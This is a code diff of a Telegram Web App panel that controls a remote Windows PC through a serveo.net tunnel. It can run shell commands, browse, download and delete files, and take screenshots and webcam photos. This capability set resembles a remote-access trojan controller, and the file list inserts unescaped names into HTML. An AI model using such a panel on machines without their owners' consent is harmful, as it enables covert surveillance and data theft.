@@ -258,7 +258,7 @@
     </div>
 
     <div class="connection-bar">
-        <input type="text" id="serverIP" class="connection-input" placeholder="IP:порт (localhost:5000)" value="localhost:5000">
+        <input type="text" id="serverIP" class="connection-input" placeholder="Адрес сервера (например: mysite.serveo.net)" value="1d72e1d98c7a5acd.serveo.net">
         <button class="connection-btn" onclick="testConnection()">🔄</button>
     </div>
     <div id="connectionStatus" class="connection-status">⏳ Проверка...</div>
@@ -375,11 +375,17 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        let serverAddress = localStorage.getItem('serverAddr') || 'localhost:5000';
+        // Настройки
+        let serverAddress = localStorage.getItem('serverAddr') || '1d72e1d98c7a5acd.serveo.net';
         let currentDir = 'C:\\';
         document.getElementById('serverIP').value = serverAddress;
 
-        function getBaseUrl() { return `https://${serverAddress}`; }
+        // ==================== ИСПРАВЛЕННАЯ ФУНКЦИЯ getBaseUrl ====================
+        function getBaseUrl() {
+            // Убираем возможный порт из serverAddress
+            let cleanAddress = serverAddress.split(':')[0];
+            return `https://${cleanAddress}`;
+        }
 
         function showStatus(text, type = 'info') {
             const s = document.getElementById('status');
@@ -392,16 +398,28 @@
         async function apiRequest(endpoint, method = 'GET', data = null) {
             try {
                 const url = getBaseUrl() + endpoint;
-                const opts = { method, headers: {} };
+                console.log('Запрос к:', url);
+                
+                const opts = { 
+                    method, 
+                    headers: {},
+                    mode: 'cors'  // Важно!
+                };
+                
                 if (data) {
                     opts.headers['Content-Type'] = 'application/json';
                     opts.body = JSON.stringify(data);
                 }
+                
                 const res = await fetch(url, opts);
                 if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                if (endpoint.includes('screenshot') || endpoint.includes('webcam')) return await res.blob();
+                
+                if (endpoint.includes('screenshot') || endpoint.includes('webcam')) {
+                    return await res.blob();
+                }
                 return await res.json();
             } catch (e) {
+                console.error('Ошибка API:', e);
                 showStatus('❌ ' + e.message, 'error');
                 throw e;
             }
@@ -413,7 +431,7 @@
                 const data = await apiRequest('/api/command', 'POST', { command: cmd, params });
                 if (data?.success) {
                     showStatus('✅ OK', 'success');
-                    // Обновляем соответствующий output
+                    
                     if (cmd === 'system') {
                         document.getElementById('systemOutput').innerHTML = formatSystem(data.data);
                     } else if (cmd === 'network' || cmd === 'externalip' || cmd === 'wifi') {
@@ -423,7 +441,7 @@
                     } else if (cmd === 'cmd') {
                         document.getElementById('cmdOutput').innerHTML = data.output || formatSimple(data.data);
                     }
-                    // Обновляем статистику в шапке, если пришла
+                    
                     if (data.data && data.data.cpu !== undefined) {
                         document.getElementById('statCPU').textContent = data.data.cpu + '%';
                         document.getElementById('statRAM').textContent = data.data.ram + '%';
@@ -463,47 +481,57 @@
         }
 
         async function testConnection() {
-            serverAddress = document.getElementById('serverIP').value;
+            serverAddress = document.getElementById('serverIP').value.split(':')[0];
             localStorage.setItem('serverAddr', serverAddress);
+            
             try {
-                const res = await fetch(getBaseUrl() + '/');
+                const res = await fetch(getBaseUrl() + '/', { mode: 'cors' });
                 const text = await res.text();
                 if (text.includes('✅')) {
                     document.getElementById('connectionStatus').innerText = '✅ Подключено';
                     document.getElementById('connectionText').innerText = 'Онлайн';
                     showStatus('✅ Подключено', 'success');
                     loadDashboard();
+                } else {
+                    throw new Error('Неверный ответ');
                 }
-            } catch {
+            } catch (e) {
                 document.getElementById('connectionStatus').innerText = '❌ Нет соединения';
                 document.getElementById('connectionText').innerText = 'Офлайн';
+                showStatus('❌ Ошибка подключения', 'error');
             }
         }
 
         async function loadDashboard() {
-            const data = await apiRequest('/api/dashboard');
-            if (data?.success) {
-                document.getElementById('statCPU').textContent = data.data.cpu + '%';
-                document.getElementById('statRAM').textContent = data.data.ram + '%';
-                document.getElementById('statDISK').textContent = data.data.disk + '%';
+            try {
+                const data = await apiRequest('/api/dashboard');
+                if (data?.success) {
+                    document.getElementById('statCPU').textContent = data.data.cpu + '%';
+                    document.getElementById('statRAM').textContent = data.data.ram + '%';
+                    document.getElementById('statDISK').textContent = data.data.disk + '%';
+                }
+            } catch (e) {
+                // Игнорируем ошибку
             }
         }
 
         async function listFiles() {
-            const data = await apiRequest('/api/files?path=' + encodeURIComponent(currentDir));
-            if (data?.success) {
-                currentDir = data.current_dir;
-                document.getElementById('currentPath').textContent = currentDir;
-                let html = '';
-                data.files.slice(0, 30).forEach(f => {
-                    html += `<div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
-                        <span class="file-icon">${f.is_dir ? '📁' : '📄'}</span>
-                        <span class="file-name">${f.name}</span>
-                        <span class="file-size">${f.size}</span>
-                    </div>`;
-                });
-                document.getElementById('fileList').innerHTML = html;
-            }
+            try {
+                const data = await apiRequest('/api/files?path=' + encodeURIComponent(currentDir));
+                if (data?.success) {
+                    currentDir = data.current_dir;
+                    document.getElementById('currentPath').textContent = currentDir;
+                    let html = '';
+                    data.files.slice(0, 30).forEach(f => {
+                        html += `<div class="file-item" onclick="selectFile('${f.name.replace(/'/g, "\\'")}')">
+                            <span class="file-icon">${f.is_dir ? '📁' : '📄'}</span>
+                            <span class="file-name">${f.name}</span>
+                            <span class="file-size">${f.size}</span>
+                        </div>`;
+                    });
+                    document.getElementById('fileList').innerHTML = html;
+                }
+            } catch (e) {}
         }
 
         function goBack() {
@@ -514,16 +542,19 @@
         }
 
         function quickPath(p) {
-            // заменим %APPDATA% и %TEMP% на реальные пути (клиентская часть не может, но сервер понимает)
             currentDir = p;
             listFiles();
         }
 
-        function selectFile(n) { document.getElementById('fileName').value = n; }
+        function selectFile(n) { 
+            document.getElementById('fileName').value = n; 
+        }
 
         async function downloadFile() {
             const n = document.getElementById('fileName').value;
-            if (n) window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + n), '_blank');
+            if (n) {
+                window.open(getBaseUrl() + '/api/download?path=' + encodeURIComponent(currentDir + '\\' + n), '_blank');
+            }
         }
 
         async function deleteFile() {
@@ -549,7 +580,9 @@
                 const url = URL.createObjectURL(blob);
                 showImageModal(url);
                 showStatus('✅ Скриншот готов', 'success');
-            } catch { showStatus('❌ Ошибка', 'error'); }
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
+            }
         }
 
         async function takeWebcamPhoto() {
@@ -559,7 +592,9 @@
                 const url = URL.createObjectURL(blob);
                 showImageModal(url);
                 showStatus('✅ Фото готово', 'success');
-            } catch { showStatus('❌ Ошибка', 'error'); }
+            } catch { 
+                showStatus('❌ Ошибка', 'error'); 
+            }
         }
 
         function showImageModal(url) {
@@ -592,6 +627,7 @@
             if (tab === 'procs') sendCommand('processes');
         }
 
+        // Инициализация
         setTimeout(() => {
             testConnection();
             loadDashboard();
@@ -600,4 +636,3 @@
     </script>
 </body>
 </html>
-
